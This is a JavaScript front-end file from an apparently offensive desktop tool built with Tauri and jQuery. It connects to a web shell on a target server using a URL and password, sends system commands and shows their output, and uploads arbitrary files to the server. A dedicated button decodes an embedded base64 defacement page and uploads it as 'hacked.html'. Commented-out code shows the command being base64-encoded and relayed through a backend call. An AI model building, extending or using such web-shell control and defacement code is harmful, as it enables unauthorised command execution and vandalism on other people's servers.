// @ts-ignore
import { invoke } from "@tauri-apps/api/tauri";
import { message } from "@tauri-apps/api/dialog";
import { readTextFile } from "@tauri-apps/api/fs";

// import { ask } from "@tauri-apps/api/dialog";
import $ from "jquery";

import { echoCommandResponse } from "./modules/terminal.js"
import { stringToBase64, decodeBase64 } from "./modules/utils.js";
import { upload_file } from "./modules/file_upload.js";
// import { checkUrlAndPassword } from "./modules/utils.js";
import { BLACK_PAGE_BASE64, BLACK_PAGE_PATH } from "./constent.js";

const ERROR = "Error";
const WARNING = "Warning";

// @ts-ignore
let url = localStorage.getItem("url") || "";
// @ts-ignore
let password = localStorage.getItem("password") || "";
// @ts-ignore
let command = localStorage.getItem("command") || "";


function readFile(file, callback) {
  const reader = new FileReader();

  reader.onload = function (e) {
    // e.target.result 包含了文件的内容
    // @ts-ignore
    const fileContent = e.target.result;
    callback(fileContent); // 通过回调函数传递文件内容
  };

  reader.readAsText(file);
}

// 上传文件
const fileSelector = document.getElementById("file-selector");
// @ts-ignore
fileSelector.addEventListener("change", async (event) => {
  // @ts-ignore
  const fileList = event.target.files;
  if (fileList.length === 0) {
    console.error("No file selected");
    return;
  }
  const file = fileList[0];
  const filename = file.name;

  const url = localStorage.getItem("url") || "";
  const password = localStorage.getItem("password") || "";
  const command = localStorage.getItem("command") || "";

  if (url === "" || password === "" || command === "") {
    await message("Please enter url, password and command first.", WARNING);
  }

  readFile(file, (fileContent) => {
    // console.log(url, password, fileContent, filename);
    upload_file(url, password, fileContent, filename);
  });
});


const uploadBlackPageBtn = document.getElementById("uploadBlackPageBtn");
// @ts-ignore
uploadBlackPageBtn.addEventListener("click", async function () {
  // const path = await readTextFile('hack.html', )
  // const blackPageContent = invoke("read_file_to_string", { path: "./hack.html" });
  const fileContent = decodeBase64(BLACK_PAGE_BASE64);

  console.log(fileContent);
  upload_file(url, password, fileContent, "hacked.html");
  // const blackPage = 'src/hack.html';
  // readFile(blackPageContent, (fileContent) => {
  //   console.log(file);
  //   upload_file(url, password, fileContent, "hacked.html");
  // })
});


$(function () {
  $("#connectToTarget").on("submit", async function (event) {
    event.preventDefault();
    const url = $("#url").val();
    const password = $("#password").val();
    // passUrl(url, password);

    const command = $("#command").val();

    echoCommandResponse(url, password, command);
  });
});


// const warning = "Warning!";

// async function test() {
//   try {
//     const message = await invoke("my_custom_command");
//     const messageElement = document.getElementById("message");
//     if (messageElement) {
//       messageElement.innerText = message;
//     } else {
//       console.error("Element with id 'message' not found.");
//     }

//   } catch (e) {
//     console.error("Error invoking command:", e);
//   }
// }


// async function passUrl(url, password) {

//   checkUrlAndPassword(url, password);

//   try {
//     const response = await invoke("submit_form", { url, password });
//     $("#respons-message").text(response);
//   } catch (e) {
//     console.error("Error submitting form:", e);
//     $("#response-message").text(
//       "An error occurred while submitting the form."
//     );
//   }

// }

// // jquery 写法
// $(function () {
//   $("#invoke-button").click(test);
// });




// function isValidUrl(url) {
//   try {
//     new URL(url);
//     return true;
//   } catch (err) {
//     return false;
//   }
// }

// async function echoCommandResponse(url, password, command) {
//   checkUrlAndPassword(url, password);

//   try {
//     const response = await invoke("base64_encode_system_command", { url, key: password, command });

//     // base64 decode
//     const decoder = new TextDecoder("utf-8");
//     const decodedText = decoder.decode(new Uint8Array(atob(response).split('').map(c => c.charCodeAt(0))));

//     const htmlSafeText = decodedText.replace(/\n/g, '<br>');
//     $("#respons-message").html(htmlSafeText);
//   } catch (e) {
//     console.error("Error in :", e);
//     $("#response-message").text(
//       "An error occurred while ..."
//     );
//   }
// }




